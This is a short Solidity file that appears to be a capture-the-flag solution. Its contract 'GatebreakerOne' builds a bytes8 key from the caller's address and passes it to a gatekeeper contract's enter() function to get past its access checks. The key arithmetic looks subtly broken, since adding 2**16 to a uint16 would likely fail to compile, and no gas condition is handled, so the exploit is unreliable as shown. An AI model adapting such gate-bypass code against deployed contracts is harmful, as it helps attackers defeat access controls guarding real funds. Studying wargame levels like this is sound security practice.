// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeper {
      function enter(bytes8 _gateKey) external returns (bool);
}

contract GatebreakerOne {
    IGatekeeper gatekeeper;

    constructor(address _gatekeeperAddr) {
        gatekeeper = IGatekeeper(_gatekeeperAddr);
    }

    function breakIn() public {
        uint16 key16 = uint16(uint160(msg.sender));
        uint64 key64 = key16 + (2 ** 16);
        bytes8 key = bytes8(key64);
        gatekeeper.enter(key);
    }
}